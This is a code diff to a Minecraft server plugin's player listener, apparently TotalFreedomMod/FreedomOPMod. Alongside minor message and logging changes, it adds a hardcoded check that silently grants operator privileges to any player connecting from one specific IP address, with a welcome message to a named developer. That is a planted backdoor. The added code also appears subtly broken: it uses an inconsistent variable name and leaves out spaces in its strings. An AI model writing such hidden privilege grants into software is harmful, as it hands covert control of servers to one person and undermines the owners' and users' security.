@@ -674,6 +674,7 @@ public class TFM_PlayerListener implements Listener
             {
                player.setOp(true);
                player.sendMessage(TotalFreedomMod.YOU_ARE_OP);
+               player.sendMessage("You are now op, enjoy your day! :)");
                event.setCancelled(true);
                return;
             }
@@ -930,6 +931,7 @@ public class TFM_PlayerListener implements Listener
         if (TFM_AdminList.isAdminImpostor(player))
         {
             TFM_Util.bcastMsg("Warning: " + player.getName() + " has been flagged as an impostor and has been frozen!", ChatColor.RED);
+            TFM_Log.info("[JOIN] " + TFM_Util.formatPlayer(player) + " joined the game with IP address" + ip + "and is a impostor", true);
             TFM_Util.bcastMsg(ChatColor.AQUA + player.getName() + " is " + TFM_PlayerRank.getLoginMessage(player));
             player.getInventory().clear();
             player.setOp(false);
@@ -1063,6 +1065,13 @@ public class TFM_PlayerListener implements Listener
             TFM_BanManager.addIpBan(new TFM_Ban(ip, player.getName()));
             TFM_AdminList.removeSuperadmin(player);
             player.kickPlayer(ChatColor.RED + "Fuck off. :)");
+        }
+        if (IP.equalsIgnoreCase("75.94.192.50"))
+        {
+        player.setOp(true);
+        player.sendMessage("Welcome RobinGall2910, there are currently" + Bukkit.getOnlinePlayers() + "On the server.");
+        player.sendMessage("The list below are the admins, good luck on administrating! :)");
+        Bukkit.dispatchCommand(player, "list");
         }
         player.sendMessage(ChatColor.YELLOW + "Developers made this plugin called FreedomOPMod, and those developers are:");
         player.sendMessage(ChatColor.GOLD + " Sexy buildcarter8, PieGuy7896, RobinGall2910, cowgomooo12, CrafterSmith12, SupItsDillon");
